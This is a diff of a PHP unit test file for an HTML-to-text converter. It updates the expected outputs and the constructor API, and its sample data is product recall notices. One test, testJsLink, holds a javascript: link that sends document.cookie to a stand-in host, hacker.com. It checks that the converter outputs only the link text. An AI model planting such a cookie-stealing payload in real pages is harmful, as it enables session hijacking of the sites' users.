@@ -22,7 +22,7 @@ class BasicTest extends \Codeception\Test\Unit
             ],
             'Empty b tag in HTML content' => [
                 'html' => 'Hello, <b></b>',
-                'expected' => 'Hello,',
+                'expected' => 'Hello, ',
             ],
             'Zero is not empty' => [
                 'html' => '0',
@@ -34,7 +34,7 @@ class BasicTest extends \Codeception\Test\Unit
             ],
             'Paragraph text with linebreak flat' => [
                 'html' => '<p>Foo<br/>Bar</p>',
-                'expected' => "Foo\nBar",
+                'expected' => "Foo\nBar\n",
             ],
             'Paragraph text with linebreak formatted with newline' => [
                 'html' => <<<EOT
@@ -44,7 +44,11 @@ class BasicTest extends \Codeception\Test\Unit
     Bar
 </p>
 EOT,
-                'expected' => "Foo\nBar",
+                'expected' => <<<EOT
+Foo
+Bar
+
+EOT,
             ],
             'Paragraph text with linebreak formatted with newline, but without whitespace' => [
                 'html' => <<<EOT
@@ -59,6 +63,7 @@ Foo
 Bar
 
 lall
+
 EOT,
             ],
             'Paragraph text with linebreak formatted with indentation' => [
@@ -95,16 +100,16 @@ EOT,
      */
     public function testBasic(string $html, string $expected): void
     {
-        $html2Text = new Html2Text();
-        static::assertSame($expected, $html2Text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testDel(): void
     {
         $html = 'My <del>Résumé</del> Curriculum Vitæ';
         $expected = 'My Résumé Curriculum Vitæ';
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testMultilineHtmlString()
@@ -133,15 +138,16 @@ EOT,
 EOT;
 
         $expected = <<<EOT
-Disposition: Return to Vendor from Distribution
+ Disposition: Return to Vendor from Distribution 
 
-Disposition: Remove
+ Disposition: Remove 
 
-HTML entities: ’ & Â ® “ ” – •
+ HTML entities: ’ & Â ® “ ” – • 
+
 EOT;
 
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testNewLines()
@@ -167,11 +173,34 @@ and this also goes for headings
 
 test
 
+ test 
+lall
+EOT;
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testNewLinesSingleHtmlLine()
+    {
+        $html = <<<EOT
+<p>Between this and</p><p>foo&zwnj;bar</p><p>this paragraph there should be only one newline</p><h1>and this also goes for headings</h1><h1 style="color: red;">test</h1>test<br>lall
+EOT;
+        $expected = <<<EOT
+Between this and
+
+foo‌bar
+
+this paragraph there should be only one newline
+
+and this also goes for headings
+
+test
+
 test
 lall
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testEncodings()
@@ -192,7 +221,7 @@ EOT;
 EOT;
         $expected = <<<EOT
 & < >
-! " # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
+  ! " # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
 À Á Â Ã Ä Å Æ Ç È É Ê Ë Ì Í Î Ï Ð Ñ Ò Ó Ô Õ Ö Ø Ù Ú Û Ü Ý Þ ß à á â ã ä å æ ç è é ê ë ì í î ï ð ñ ò ó ô õ ö ø ù ú û ü ý þ ÿ
 À Á Â Ã Ä Å Æ Ç È É Ê Ë Ì Í Î Ï Ð Ñ Ò Ó Ô Õ Ö Ø Ù Ú Û Ü Ý Þ ß à á â ã ä å æ ç è é ê ë ì í î ï ð ñ ò ó ô õ ö ø ù ú û ü ý þ ÿ
   ¡ ¢ £ ¤ ¥ ¦ § ¨ © ª « ¬ ­ ® ¯ ° ± ² ³ ´ µ ¶ ¸ ¹ º » ¼ ½ ¾ ¿ × ÷
@@ -203,9 +232,10 @@ EOT;
 Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϑ ϒ ϖ
 Œ œ Š š Ÿ ƒ ˆ ˜       ‌ ‍ ‎ ‏ – — ‘ ’ ‚ “ ” „ † ‡ • … ‰ ′ ″ ‹ › ‾ € ™ ← ↑ → ↓ ↔ ↵ ⌈ ⌉ ⌊ ⌋ ◊ ♠ ♣ ♥ ♦
 Œ œ Š š Ÿ ƒ ˆ ˜       ‌ ‍ ‎ ‏ – — ‘ ’ ‚ “ ” „ † ‡ • … ‰ ′ ″ ‹ › ‾ € ™ ← ↑ → ↓ ↔ ↵ ⌈ ⌉ ⌊ ⌋ ◊ ♠ ♣ ♥ ♦
+
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testNumericHexCharacterReferences()
@@ -218,33 +248,24 @@ EOT;
 ! " # $ % & ' ( ) * + , - . / 0 1 2 3 4 5 6 7 8 9 : ; < = > ? @ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z [ \\ ] ^ _ ` a b c d e f g h i j k l m n o p q r s t u v w x y z { | } ~
 ƒ Α Β Γ Δ Ε Ζ Η Θ Ι Κ Λ Μ Ν Ξ Ο Π Ρ Σ Τ Υ Φ Χ Ψ Ω α β γ δ ε ζ η θ ι κ λ μ ν ξ ο π ρ ς σ τ υ φ χ ψ ω ϑ ϒ ϖ • … ′ ″ ‾ ⁄ ℘ ℑ ℜ ™ ℵ ← ↑ → ↓ ↔ ↵ ⇐ ⇑ ⇒ ⇓ ⇔ ∀ ∂ ∃ ∅ ∇ ∈ ∉ ∋ ∏ ∑ − ∗ √ ∝ ∞ ∠ ∧ ∨ ∩ ∪ ∫ ∴ ∼ ≅ ≈ ≠ ≡ ≤ ≥ ⊂ ⊃ ⊄ ⊆ ⊇ ⊕ ⊗ ⊥ ⋅ ⌈ ⌉ ⌊ ⌋ 〈 〉 ◊ ♠ ♣ ♥ ♦
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testMailtoLink()
     {
         $html = <<<EOT
 <p>
-  <strong style="color: rgb(51, 51, 51)">Disposition:</strong
-  ><span style="color: rgb(51, 51, 51)">&nbsp;Destroy at Store Level</span
-  ><span style="color: rgb(230, 0, 0)">&nbsp;</span>
+  <strong style="color: rgb(51, 51, 51)">Disposition:</strong><span style="color: rgb(51, 51, 51)">&nbsp;Destroy at Store Level</span><span style="color: rgb(230, 0, 0)">&nbsp;</span>
 </p>
 <p>
-  <strong style="color: rgb(51, 51, 51)"
-    >Any product that is pulled must have the name of the Responsible Party and
-    a separate Witness noted</strong
-  >
+  <strong style="color: rgb(51, 51, 51)">Any product that is pulled must have the name of the Responsible Party and
+    a separate Witness noted</strong>
 </p>
 <p>
   <strong style="color: rgb(51, 51, 51)">Contact Info:</strong>
   Peek Rogurt, Toni Tester, VP Sales,
-  <a
-    href="mailto:toni.tester@example.com"
-    rel="noopener noreferrer"
-    target="_blank"
-    >Send Email</a
-  >, 555-111-1111
+  <a href="mailto:toni.tester@example.com" rel="noopener noreferrer" target="_blank">Send Email</a>, 555-111-1111
 </p>
 EOT;
         $expected = <<<EOT
@@ -252,10 +273,11 @@ Disposition: Destroy at Store Level 
 
 Any product that is pulled must have the name of the Responsible Party and a separate Witness noted
 
-Contact Info: Peek Rogurt, Toni Tester, VP Sales, toni.tester@example.com, 555-111-1111
+Contact Info: Peek Rogurt, Toni Tester, VP Sales, Send Email, 555-111-1111
+
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testJsLink()
@@ -264,53 +286,58 @@ EOT;
 <a href="javascript:window.open('http://hacker.com?cookie='+document.cookie);">Link text</a>
 EOT;
         $expected = 'Link text';
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testLiTag()
     {
         $html = <<<EOT
 <p>
-  <strong style="color: rgb(51, 51, 51)">Disposition:</strong
-  ><span style="color: rgb(51, 51, 51)">&nbsp;</span>
+  <strong style="color: rgb(51, 51, 51)">Disposition:</strong><span style="color: rgb(51, 51, 51)">&nbsp;</span>
 </p>
 <ul>
-  <li>
-    <strong>Locate</strong>&nbsp;all impacted product in the front and back of
-    house
-  </li>
+  <li><strong>Locate</strong>&nbsp;all impacted product in the front and back of house</li>
   <li>Immediately&nbsp;<strong>dispose</strong>&nbsp;of the product</li>
-  <li>
-    <strong>Do not request credit</strong> for discarded product on The
-    Coffee Company or through your LSR. Coffee Company will issue credits based on
-    the amount of impacted product shipped to your store by April 1, as shown on
-    the store list.
-  </li>
-  <li>
-    <strong>Check all incoming orders carefully</strong> for the impacted items;
-    if you receive additional impacted product follow the steps above to discard
-  </li>
+  <li><strong>Do not request credit</strong> for discarded product on The Coffee Company or through your LSR. Coffee Company will issue credits based on the amount of impacted product shipped to your store by April 1, as shown on the store list.</li>
+  <li><strong>Check all incoming orders carefully</strong> for the impacted items; if you receive additional impacted product follow the steps above to discard</li>
   <li><strong>Do not sell, donate or give away any of this product</strong></li>
   <li>Reorder additional inventory as needed</li>
 </ul>
 <p>
-  <strong style="color: rgb(51, 51, 51)"
-    >Any product that is pulled must have the name of the Responsible Party and
-    a separate Witness noted.
-  </strong>
+  <strong style="color: rgb(51, 51, 51)">Any product that is pulled must have the name of the Responsible Party and a separate Witness noted.</strong>
 </p>
 <p>
   <strong style="color: rgb(51, 51, 51)">Contact Info:</strong>
-  <strong style="color: rgb(51, 51, 51)">Contact Info: </strong
-  ><span style="color: rgb(51, 51, 51)"
-    >Coffee Company, Tonia</span
-  >
-  <span style="color: rgb(51, 51, 51)"
-    >Tester, Sr. Operations Consultation Manager, ttester@example.com,
-    555-111-1111</span
-  >
+  <strong style="color: rgb(51, 51, 51)">Contact Info: </strong>
+  <span style="color: rgb(51, 51, 51)">Coffee Company, Tonia</span>
+  <span style="color: rgb(51, 51, 51)">Tester, Sr. Operations Consultation Manager, ttester@example.com,
+    555-111-1111</span>
 </p>
+EOT;
+        $expected = <<<EOT
+Disposition: 
+
+ \t* Locate all impacted product in the front and back of house
+ \t* Immediately dispose of the product
+ \t* Do not request credit for discarded product on The Coffee Company or through your LSR. Coffee Company will issue credits based on the amount of impacted product shipped to your store by April 1, as shown on the store list.
+ \t* Check all incoming orders carefully for the impacted items; if you receive additional impacted product follow the steps above to discard
+ \t* Do not sell, donate or give away any of this product
+ \t* Reorder additional inventory as needed
+
+Any product that is pulled must have the name of the Responsible Party and a separate Witness noted.
+
+Contact Info: Contact Info: Coffee Company, Tonia Tester, Sr. Operations Consultation Manager, ttester@example.com, 555-111-1111
+
+EOT;
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
+    }
+
+    public function testLiTagSingleLineHtml()
+    {
+        $html = <<<EOT
+<p><strong style="color: rgb(51, 51, 51)">Disposition:</strong><span style="color: rgb(51, 51, 51)">&nbsp;</span></p><ul><li><strong>Locate</strong>&nbsp;all impacted product in the front and back of house</li><li>Immediately&nbsp;<strong>dispose</strong>&nbsp;of the product</li><li><strong>Do not request credit</strong> for discarded product on The Coffee Company or through your LSR. Coffee Company will issue credits based on the amount of impacted product shipped to your store by April 1, as shown on the store list.</li><li><strong>Check all incoming orders carefully</strong> for the impacted items; if you receive additional impacted product follow the steps above to discard</li><li><strong>Do not sell, donate or give away any of this product</strong></li><li>Reorder additional inventory as needed</li></ul><p><strong style="color: rgb(51, 51, 51)">Any product that is pulled must have the name of the Responsible Party and a separate Witness noted.</strong></p><p><strong style="color: rgb(51, 51, 51)">Contact Info: </strong><span style="color: rgb(51, 51, 51)">Coffee Company, Tonia </span><span style="color: rgb(51, 51, 51)">Tester, Sr. Operations Consultation Manager, ttester@example.com, 555-111-1111</span></p>
 EOT;
         $expected = <<<EOT
 Disposition: 
@@ -324,39 +351,32 @@ Disposition: 
 
 Any product that is pulled must have the name of the Responsible Party and a separate Witness noted.
 
-Contact Info: Contact Info: Coffee Company, Tonia Tester, Sr. Operations Consultation Manager, ttester@example.com, 555-111-1111
+Contact Info: Coffee Company, Tonia Tester, Sr. Operations Consultation Manager, ttester@example.com, 555-111-1111
+
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testRegularLink()
     {
         $html = <<<EOT
-<p>
-  <strong style="color: rgb(230, 0, 0)"
-    >Please make sure you enter your information for the 5 items listed in the
+<p><strong style="color: rgb(230, 0, 0)">Please make sure you enter your information for the 5 items listed in the
     recall in Recall Infolink. Check the surrounding areas/products for any
     signs of bugs. If you find additional items with bugs, please scan your
     product out as recall and destroy the product. Please&nbsp;enter any of the
     additional product you find with bugs into the Google spreadsheet, drive
-    link here: </strong
-  ><a
-    href="https://example.com/download/file/d/1knF5cG?usp=sharing"
-    rel="noopener noreferrer"
-    target="_blank"
-    >https://example.com/download</a
-  >
+    link here: </strong><a href="https://example.com/download/file/d/1knF5cG?usp=sharing" rel="noopener noreferrer" target="_blank">
+  https://example.com/download
+  </a>
 </p>
 <p>
   <strong>Disposition:</strong> Scan out as Recall Reclamation and Destroy at
   Store level
 </p>
 <p>
-  <strong
-    >Any product that is pulled must have the name of the Responsible Party and
-    a separate Witness noted</strong
-  >
+  <strong>Any product that is pulled must have the name of the Responsible Party and
+    a separate Witness noted</strong>
 </p>
 <p>
   <strong>Contact Info:</strong> Tonia Tester, 555-111-1111 or Toni Tester,
@@ -372,32 +392,25 @@ Disposition: Scan out as Recall Reclamation and Destroy at Store level
 Any product that is pulled must have the name of the Responsible Party and a separate Witness noted
 
 Contact Info: Tonia Tester, 555-111-1111 or Toni Tester, 555-111-2222
+
 EOT;
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testEm()
     {
         $html = <<<EOT
 <p>
-  <strong style="color: rgb(230, 0, 0)"
-    >NOTE: <u>ONLY PULL MASTERCASES</u> from backroom and or freezers with the
+  <strong style="color: rgb(230, 0, 0)">NOTE: <u>ONLY PULL MASTERCASES</u> from backroom and or freezers with the
     affected Lot Code and Use By date.
-    <em
-      ><u
-        >DO NOT pull items that have already been made and labeled for sale.</u
-      ></em
-    >
-    See Images for reference.</strong
-  >
+    <em><u>DO NOT pull items that have already been made and labeled for sale.</u></em>
+    See Images for reference.</strong>
 </p>
 <p><strong>Disposition:</strong> Destroy at Store Level</p>
 <p>
-  <strong
-    >Any product that is pulled must have the name of the Responsible Party and
-    a separate Witness noted</strong
-  >
+  <strong>Any product that is pulled must have the name of the Responsible Party and
+    a separate Witness noted</strong>
 </p>
 <p>
   <strong>Supplier Contact Info:</strong> Toni Tester Corporation, Tonia
@@ -412,10 +425,11 @@ Disposition: Destroy at Store Level
 Any product that is pulled must have the name of the Responsible Party and a separate Witness noted
 
 Supplier Contact Info: Toni Tester Corporation, Tonia Tester, Director Sales, ttester@example.com, 555-111-1111
+
 EOT;
 
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 
     public function testNbsp()
@@ -427,9 +441,10 @@ EOT;
  Non-breaking spaces
  at start
 and end  
+
 EOT;
 
-        $html2text = new Html2Text();
-        static::assertSame($expected, $html2text->convert($html));
+        $html2text = new Html2Text($html, ['width' => -1, 'do_links' => 'inline']);
+        static::assertSame($expected, $html2text->getText());
     }
 }
